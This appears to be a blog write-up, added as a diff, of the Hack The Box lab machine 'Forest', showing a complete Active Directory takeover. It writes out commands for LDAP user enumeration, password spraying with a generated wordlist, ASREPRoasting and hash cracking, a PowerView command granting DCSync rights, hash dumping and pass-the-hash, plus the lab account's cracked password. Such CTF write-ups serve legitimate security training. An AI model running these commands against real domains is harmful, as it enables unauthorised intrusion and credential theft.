@@ -1,0 +1,339 @@
+<h3 id="summary">Summary</h3>
+<ul>
+  <li>A Domain Controller machine. <strong>Anonymous LDAP</strong> is enabled which we use to get <strong>a full list of AD users</strong>.</li>
+  <li><em>After performing an</em> <strong>ASREPRoast attack</strong>, we end up with a user that has <strong>PowerShell Remoting Access</strong>.</li>
+  <li><em>Using</em> <strong>BloodHound</strong> <em>for</em> <strong>Domain Enumeration</strong>, we find that the user is member of the <strong>Account Operators</strong> group which <em>gives him the privilege of adding users to AD groups other than Domain Admins etc.</em></li>
+  <li>We add our user to a group called <strong>‘Exchange Windows Permissions’</strong> which has a <strong>write DACL</strong> over the domain.</li>
+  <li><em>Abusing this privilege</em> lets us give ourselves the <strong>DCSync right</strong> over the domain using <strong>PowerView</strong> which <em>lets us grab all its NTLM hashes</em></li>
+  <li>We use the Domain <em>Administrator’s hash</em> in a simple <strong>Pass-the-Hash</strong> attack to gain full access.</li>
+</ul>
+
+<hr />
+
+<h3 id="nmap">Nmap</h3>
+<p>We start off doing a <em>comprehensive</em> nmap scan with <strong>default scripts</strong> and <strong>service detection</strong></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT      STATE SERVICE      VERSION
+53/tcp    open  domain       Simple DNS Plus
+88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2022-04-05 19:09:07Z)
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf       .NET Message Framing
+47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49664/tcp open  msrpc        Microsoft Windows RPC
+49665/tcp open  msrpc        Microsoft Windows RPC
+49666/tcp open  msrpc        Microsoft Windows RPC
+49667/tcp open  msrpc        Microsoft Windows RPC
+49671/tcp open  msrpc        Microsoft Windows RPC
+49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+49677/tcp open  msrpc        Microsoft Windows RPC
+49684/tcp open  msrpc        Microsoft Windows RPC
+49703/tcp open  msrpc        Microsoft Windows RPC
+49967/tcp open  msrpc        Microsoft Windows RPC
+Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   date: 2022-04-05T19:10:01
+|_  start_date: 2022-04-05T18:45:37
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: required
+| smb-os-discovery: 
+|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
+|   Computer name: FOREST
+|   NetBIOS computer name: FOREST\x00
+|   Domain name: htb.local
+|   Forest name: htb.local
+|   FQDN: FOREST.htb.local
+|_  System time: 2022-04-05T12:10:02-07:00
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled and required
+|_clock-skew: mean: 2h26m50s, deviation: 4h02m31s, median: 6m49s
+</code></pre></div></div>
+
+<h3 id="domain-controller-detected">Domain Controller Detected</h3>
+
+<p>We find a collection of ports that give us a high probability that this is windows machine and a domain controller:</p>
+<ul>
+  <li>DNS on port 53</li>
+  <li>Kerberos on port 88</li>
+  <li>SMB on port 445</li>
+  <li>LDAP on port 636</li>
+  <li>Global Catalog on port 3268</li>
+  <li>WinRM on port 5985</li>
+</ul>
+
+<p>From the nmap script <code class="language-plaintext highlighter-rouge">smb-os-discovery</code>, the domain name should be <code class="language-plaintext highlighter-rouge">htb.local</code></p>
+
+<h3 id="fetching-a-list-of-all-ad-users">Fetching a list of all AD users</h3>
+
+<p>We want to start enumerating users. So we use an impacket tool called <code class="language-plaintext highlighter-rouge">GetADUsers.py</code>.</p>
+
+<p>The command is: <code class="language-plaintext highlighter-rouge">GetADUsers.py -dc-ip 10.10.10.161 "htb.local/" -all</code></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
+
+[*] Querying 10.10.10.161 for information about domain.
+Name                  Email                           PasswordLastSet      LastLogon           
+--------------------  ------------------------------  -------------------  -------------------
+Administrator         Administrator@htb.local         2021-08-30 20:51:58.690463  2022-04-05 14:46:24.124409 
+Guest                                                 &lt;never&gt;              &lt;never&gt;             
+DefaultAccount                                        &lt;never&gt;              &lt;never&gt;             
+krbtgt                                                2019-09-18 06:53:23.467452  &lt;never&gt;             
+$331000-VK4ADACQNUCA                                  &lt;never&gt;              &lt;never&gt;             
+SM_2c8eef0a09b545acb  SystemMailbox{1f05a927-89c0-4725-adca-4527114196a1}@htb.local  &lt;never&gt;              &lt;never&gt;             
+SM_ca8c2ed5bdab4dc9b  SystemMailbox{bb558c35-97f1-4cb9-8ff7-d53741dc928c}@htb.local  &lt;never&gt;              &lt;never&gt;             
+SM_75a538d3025e4db9a  SystemMailbox{e0dc1c29-89c3-4034-b678-e6c29d823ed9}@htb.local  &lt;never&gt;              &lt;never&gt;             
+SM_681f53d4942840e18  DiscoverySearchMailbox{D919BA05-46A6-415f-80AD-7E09334BB852}@htb.local  &lt;never&gt;              &lt;never&gt;             
+SM_1b41c9286325456bb  Migration.8f3e7716-2011-43e4-96b1-aba62d229136@htb.local  &lt;never&gt;              &lt;never&gt;             
+SM_9b69f1b9d2cc45549  FederatedEmail.4c1f4d8b-8179-4148-93bf-00a95fa1e042@htb.local  &lt;never&gt;              &lt;never&gt;             
+SM_7c96b981967141ebb  SystemMailbox{D0E409A0-AF9B-4720-92FE-AAC869B0D201}@htb.local  &lt;never&gt;              &lt;never&gt;             
+SM_c75ee099d0a64c91b  SystemMailbox{2CE34405-31BE-455D-89D7-A7C7DA7A0DAA}@htb.local  &lt;never&gt;              &lt;never&gt;             
+SM_1ffab36a2f5f479cb  SystemMailbox{8cc370d3-822a-4ab8-a926-bb94bd0641a9}@htb.local  &lt;never&gt;              &lt;never&gt;             
+HealthMailboxc3d7722  HealthMailboxc3d7722415ad41a5b19e3e00e165edbe@htb.local  2019-09-23 18:51:31.892097  2019-09-23 18:57:12.361516 
+HealthMailboxfc9daad  HealthMailboxfc9daad117b84fe08b081886bd8a5a50@htb.local  2019-09-23 18:51:35.267114  2019-09-23 18:52:05.736012 
+HealthMailboxc0a90c9  HealthMailboxc0a90c97d4994429b15003d6a518f3f5@htb.local  2019-09-19 07:56:35.206329  &lt;never&gt;             
+HealthMailbox670628e  HealthMailbox670628ec4dd64321acfdf6e67db3a2d8@htb.local  2019-09-19 07:56:45.643993  &lt;never&gt;             
+HealthMailbox968e74d  HealthMailbox968e74dd3edb414cb4018376e7dd95ba@htb.local  2019-09-19 07:56:56.143969  &lt;never&gt;             
+HealthMailbox6ded678  HealthMailbox6ded67848a234577a1756e072081d01f@htb.local  2019-09-19 07:57:06.597012  &lt;never&gt;             
+HealthMailbox83d6781  HealthMailbox83d6781be36b4bbf8893b03c2ee379ab@htb.local  2019-09-19 07:57:17.065809  &lt;never&gt;             
+HealthMailboxfd87238  HealthMailboxfd87238e536e49e08738480d300e3772@htb.local  2019-09-19 07:57:27.487679  &lt;never&gt;             
+HealthMailboxb01ac64  HealthMailboxb01ac647a64648d2a5fa21df27058a24@htb.local  2019-09-19 07:57:37.878559  &lt;never&gt;             
+HealthMailbox7108a4e  HealthMailbox7108a4e350f84b32a7a90d8e718f78cf@htb.local  2019-09-19 07:57:48.253341  &lt;never&gt;             
+HealthMailbox0659cc1  HealthMailbox0659cc188f4c4f9f978f6c2142c4181e@htb.local  2019-09-19 07:57:58.643994  &lt;never&gt;             
+sebastien                                             2019-09-19 20:29:59.544725  2019-09-22 18:29:29.586227 
+lucinda                                               2019-09-19 20:44:13.233891  &lt;never&gt;             
+svc-alfresco                                          2022-04-05 15:18:27.420771  2019-09-23 07:09:47.931194 
+andy                                                  2019-09-22 18:44:16.291082  &lt;never&gt;             
+mark                                                  2019-09-20 18:57:30.243568  &lt;never&gt;             
+santi                                                 2019-09-20 19:02:55.134828  &lt;never&gt; 
+</code></pre></div></div>
+
+<p><em>Because LDAP Anonymous access is enabled,</em> this gets us <strong>all</strong> the users in the domain. The ones below look organic enough for us to try spraying.</p>
+<ul>
+  <li>Administrator</li>
+  <li>sebastien</li>
+  <li>lucinda</li>
+  <li>svc-alfresco</li>
+  <li>andy</li>
+  <li>mark</li>
+  <li>santi</li>
+</ul>
+
+<h3 id="wordlist-generation-from-common-username-schemes">Wordlist generation from common username schemes</h3>
+
+<p><em>Since we need a wordlist,</em> We create a basic one from the most common passwords (like “P@ssw0rd” etc.) and from <strong>commonly used password convention schemes</strong> like:</p>
+<ul>
+  <li>Season + Year</li>
+  <li>Season + Year + !</li>
+  <li>Season + Special Char + Year</li>
+  <li>Company Name + Year</li>
+  <li>Company Name + Year + !</li>
+  <li>Company Name + Special Char + Year</li>
+</ul>
+
+<p>We will pretend that <code class="language-plaintext highlighter-rouge">Forest</code> is the company name even though it’s a CTF. Because that’s what I would do in a real pentest :D
+Also, the year this machine has been launched is 2019. So we will use that year as well as a couple of years around it (2017, 2018, 2020 and 2021).</p>
+
+<p>I write a quick <code class="language-plaintext highlighter-rouge">PowerShell</code> script for this:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$CompanyName = "Forest"
+$Seasons = 'Summer', 'Winter', 'Spring', 'Fall'
+$Years = 2017..2021
+$Special_Chars = '!@#$%^&amp;*'.ToCharArray()
+$Wordlist = @()
+
+Foreach($Year in $Years){
+	$Wordlist += "$CompanyName$Year"
+	$Wordlist += "$CompanyName$Year!"
+	Foreach($Season in $Seasons){
+		$Wordlist += "$Season$Year"
+		$Wordlist += "$Season$Year!"
+		Foreach($Char in $Special_Chars){
+			$Wordlist += "$Season$Char$Year"
+			$Wordlist += "$CompanyName$Char$Year"
+		}
+	}
+}
+</code></pre></div></div>
+
+<p><em>Running that script,</em> I get a list of 370 passwords to try. Not bad :D</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>..SNIP..
+Forest2019
+Forest2019!
+Summer2019
+Summer2019!
+Summer!2019
+Forest!2019
+Summer@2019
+Forest@2019
+Summer#2019
+Forest#2019
+Summer$2019
+Forest$2019
+Summer%2019
+..SNIP..
+</code></pre></div></div>
+
+<h3 id="enumerating-domain-password-policy-before-password-spraying">Enumerating domain password policy before password spraying</h3>
+
+<p>I then use <code class="language-plaintext highlighter-rouge">crackmapexec</code> to obtain the password policy. We don’t want to lock everyone one out XD</p>
+
+<p><img src="/assets/Forest/CME-Pass-Pol.jpg" alt="CME-Pass-Pol" /></p>
+
+<p>We see that <code class="language-plaintext highlighter-rouge">Account Lockout Threshold: None</code> and <code class="language-plaintext highlighter-rouge">Domain Password Lockout Admins: 0</code>. This is amazing! we can definitely bruteforce without any problems :D</p>
+
+<p>We start the spray using:
+<code class="language-plaintext highlighter-rouge">crackmapexec smb 10.10.10.161 -u users.txt -p passwords.txt --continue-on-success</code></p>
+
+<p>But we get no luck with that :/</p>
+
+<h3 id="asreproasting">ASREPRoasting</h3>
+
+<p><em>Having no credentials,</em> we can still try an attack called <code class="language-plaintext highlighter-rouge">ASREP Roasting</code>. This attack would let us grab the hashes of accounts that <strong>don’t require Kerberos PreAuthentication.</strong></p>
+
+<p>we run this attack using impacket’s <code class="language-plaintext highlighter-rouge">GetNPUsers.py</code> script:</p>
+
+<p><code class="language-plaintext highlighter-rouge">GetNPUsers.py htb.local/ -usersfile users.txt -format hashcat -outputfile asrep-hashes.txt</code></p>
+
+<p>This is after we set <code class="language-plaintext highlighter-rouge">10.10.10.161</code> as our name server in <code class="language-plaintext highlighter-rouge">/etc/resolv.conf</code>. We do this because impacket does DNS lookups in the background.</p>
+
+<p><img src="/assets/Forest/etc-resolv.jpg" alt="etc-resolv" /></p>
+
+<p><img src="/assets/Forest/asrep-roast.jpg" alt="asrep-roast" /></p>
+
+<p>notice that the user <code class="language-plaintext highlighter-rouge">svc-alfresco</code> doesn’t show in the script console output. I’m not sure why xD but the hash was pushed out to the <code class="language-plaintext highlighter-rouge">asrep-hashes.txt</code> file.</p>
+
+<h3 id="cracking-tgt-with-john">Cracking TGT with <code class="language-plaintext highlighter-rouge">John</code></h3>
+
+<p>we use <code class="language-plaintext highlighter-rouge">john</code> to crack the hash and the password for <code class="language-plaintext highlighter-rouge">svc-alfresco</code> turns out to be <code class="language-plaintext highlighter-rouge">s3rvice</code></p>
+
+<p><img src="/assets/Forest/cracked.jpg" alt="cracked" /></p>
+
+<p><em>in case you were wondering,</em> the wordlist I used <code class="language-plaintext highlighter-rouge">gegalist.txt</code> is just one big list of all the passwords on <code class="language-plaintext highlighter-rouge">Seclists</code> (https://github.com/danielmiessler/SecLists/tree/master/Passwords) concatenated and cleaned up. I use it for all hash cracking. It’s only 21,377,691 passwords. Just kidding, it’s a pretty fat list XD</p>
+
+<p>Alright, here is our first set of creds:</p>
+<ul>
+  <li>Username: htb.local\svc-alfresco</li>
+  <li>Password: s3rvice</li>
+</ul>
+
+<h3 id="remote-code-execution">Remote Code Execution</h3>
+
+<p>We first try to login using <code class="language-plaintext highlighter-rouge">crackmapexec</code> using the <code class="language-plaintext highlighter-rouge">SMB</code> module. But that doesn’t work. This is because <code class="language-plaintext highlighter-rouge">svc-alfresco</code> isn’t a local administrator on the machine. So we try another approach for remote code execution. This time using a tool called <code class="language-plaintext highlighter-rouge">evil-winrm</code> (https://github.com/Hackplayers/evil-winrm)</p>
+
+<p><img src="/assets/Forest/evil-winrm.jpg" alt="evil-winrm" /></p>
+
+<p>it works like a charm, this is because we’re a member of the builtin group of <code class="language-plaintext highlighter-rouge">Remote Management Users</code></p>
+
+<p><img src="/assets/Forest/groups.jpg" alt="groups" /></p>
+
+<h3 id="privilege-escalation">Privilege Escalation</h3>
+
+<p><em>Right after,</em> we get down to enumeration for privesc</p>
+
+<ol>
+  <li>we look for interesting files in user profiles –&gt; nothing</li>
+  <li>we check for interesting directories in <code class="language-plaintext highlighter-rouge">c:\</code> –&gt; nothing</li>
+  <li>we check processes –&gt; nothing interesting there</li>
+  <li>we check services –&gt; access denied</li>
+  <li>we run systeminfo to get information on the kernel –&gt; access denied</li>
+  <li>we check for saved creds with <code class="language-plaintext highlighter-rouge">cmdkey /list</code> –&gt; nothing</li>
+  <li>we check our privileges with <code class="language-plaintext highlighter-rouge">whoami /privs</code> –&gt; nothing special there</li>
+  <li>we run WinPEAS (https://github.com/carlospolop/PEASS-ng) and still don’t find anything</li>
+</ol>
+
+<p>but …</p>
+
+<p><em>going back to our group memberships,</em> we do find ourselves in quite a few interesting groups:</p>
+<ol>
+  <li>Account Operators –&gt; this can let us create AD accounts and add them to groups other than high privilege ones (Administrators, Domain Admins etc.) (https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-accountoperators)</li>
+  <li>Privileged IT Accounts –&gt; this is not a standard AD group and we would want to know what those <em>Privileges</em> are :D</li>
+  <li>Service Accounts –&gt; this too might be interesting</li>
+</ol>
+
+<h3 id="domain-enumeration-with-bloodhound">Domain Enumeration with BloodHound</h3>
+
+<p><em>since we’re in a an Active Directory environment,</em> a standard tool to use is <code class="language-plaintext highlighter-rouge">BloodHound</code> (https://github.com/BloodHoundAD/BloodHound). It can help us identify paths to escalate our privileges inside a domain context. We will use it show us what can be done using the privileges that we hold.</p>
+
+<p><em>in order to supply bloodhound with the information it needs,</em> we will need to run a tool called <code class="language-plaintext highlighter-rouge">SharpHound</code> (https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors) to collect details about the domain.</p>
+
+<p>We upload it to the machine using <code class="language-plaintext highlighter-rouge">evil-winrm</code>’s <code class="language-plaintext highlighter-rouge">upload</code> function and run it using the <code class="language-plaintext highlighter-rouge">-c all</code> flag to perform all collection methods.</p>
+
+<p><img src="/assets/Forest/Sharphound-collection.jpg" alt="Sharphound-collection" /></p>
+
+<p>We’re going to transfer the data (<code class="language-plaintext highlighter-rouge">20220405150628_BloodHound.zip</code>) over to our kali machine in order to feed it to <code class="language-plaintext highlighter-rouge">bloodhound</code>.</p>
+
+<p>We do that using impacket’s <code class="language-plaintext highlighter-rouge">smbserver.py</code></p>
+
+<p><img src="/assets/Forest/smb-server.jpg" alt="smb-server" /></p>
+
+<p>and then mount it on the victim machine use the <code class="language-plaintext highlighter-rouge">net use</code> command, moving the <code class="language-plaintext highlighter-rouge">.zip</code> file and then unmounting the share.</p>
+
+<p><img src="/assets/Forest/mounting-smb.jpg" alt="mounting-smb" /></p>
+
+<p><em>afterwards,</em> we upload the file into <code class="language-plaintext highlighter-rouge">bloodhound</code> and start checking what we can do having owned the <code class="language-plaintext highlighter-rouge">svc-alfresco</code> service account. we run the <code class="language-plaintext highlighter-rouge">shortest path from owned principles</code> query:</p>
+
+<p><img src="/assets/Forest/bloodhound-query.jpg" alt="bloodhound-query" /></p>
+
+<p>This query shows us no real path to being a domain admin. So we try another query: <code class="language-plaintext highlighter-rouge">Shortest Paths to High Value Targets</code></p>
+
+<p><img src="/assets/Forest/bloodhound-query-2.jpg" alt="bloodhound-query-2" /></p>
+
+<h3 id="abusing-membership-in-account-operators--the-high-privileges-of-exchange-windows-permissions-ad-groups">Abusing membership in <code class="language-plaintext highlighter-rouge">Account Operators</code> &amp; the high privileges of <code class="language-plaintext highlighter-rouge">Exchange Windows Permissions</code> AD groups</h3>
+
+<p>It looks horrible at first. <em>But, after taking a closer look,</em> we notice that our account <em>being in the</em> <code class="language-plaintext highlighter-rouge">account operators</code> <em>group</em> can add a member to a certain group called <code class="language-plaintext highlighter-rouge">Exchange Windows Permissions</code> which happens to have <code class="language-plaintext highlighter-rouge">WriteDACL</code> on <code class="language-plaintext highlighter-rouge">htb.local</code> (<strong>The entire domain!</strong>). <em>Having that privilege</em> means we can abuse it to give ourselves the <code class="language-plaintext highlighter-rouge">DCSync</code> right that we can use to dump all the domain hashes!</p>
+
+<p><img src="/assets/Forest/path-to-DA.jpg" alt="path-to-DA" /></p>
+
+<p><img src="/assets/Forest/abuse-write-dacl.jpg" alt="abuse-write-dacl" /></p>
+
+<p>we add our user to that group using a powershell command: <code class="language-plaintext highlighter-rouge">Add-ADGroupMember 'Exchange Windows Permissions' -members 'svc-alfresco'</code></p>
+
+<p><img src="/assets/Forest/adding-to-group.jpg" alt="adding-to-group" /></p>
+
+<p>we then upload <code class="language-plaintext highlighter-rouge">PowerView.ps1</code> (https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) to the victim machine and import it using <code class="language-plaintext highlighter-rouge">import-module .\PowerView.ps1</code>. This enables access to all the powershell cmdlets included within that module.</p>
+
+<h3 id="checking-the-help-for-the-add-domainobjectacl-command">Checking the help for the <code class="language-plaintext highlighter-rouge">Add-DomainObjectAcl</code> command</h3>
+
+<p>we view the help page and usage examples of the abuse command <code class="language-plaintext highlighter-rouge">Add-DomainObjectAcl</code> using <code class="language-plaintext highlighter-rouge">Get-Help Add-DomainObjectAcl -Examples</code></p>
+
+<p><img src="/assets/Forest/abuse-command-help.jpg" alt="abuse-command-help" /></p>
+
+<p>we notice that we need to create a Powershell <code class="language-plaintext highlighter-rouge">Credential Object</code> and run the command to give our user <code class="language-plaintext highlighter-rouge">svc-alfresco</code> <code class="language-plaintext highlighter-rouge">DCSync</code> rights over <code class="language-plaintext highlighter-rouge">htb.local</code>. It should be as below:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$SecPassword = ConvertTo-SecureString 's3rvice'-AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('HTB.local\svc-alfresco', $SecPassword)
+Add-DomainObjectAcl -TargetIdentity "dc=htb,dc=local" -PrincipalIdentity 'HTB.local\svc-alfresco' -Rights DCSync -Credential $Cred -Verbose
+</code></pre></div></div>
+
+<p>This takes a little while to run but we eventually have permission to dump hashes.</p>
+
+<h3 id="and-down-the-hashes-go">And down the hashes go…</h3>
+
+<p>We use impacket’s <code class="language-plaintext highlighter-rouge">secretsdump.py</code> and voala! :D</p>
+
+<p><img src="/assets/Forest/hashes_dumped.jpg" alt="hashes_dumped" /></p>
+
+<h3 id="pass-the-hash-for-the-win-">Pass-the-Hash for the win :)</h3>
+
+<p><em>Using the administrator NTLM hash,</em> we can use <code class="language-plaintext highlighter-rouge">evil-winrm</code> to remote inside and we’re done with the box :D</p>
+
+<p><img src="/assets/Forest/got-admin.jpg" alt="got-admin" /></p>
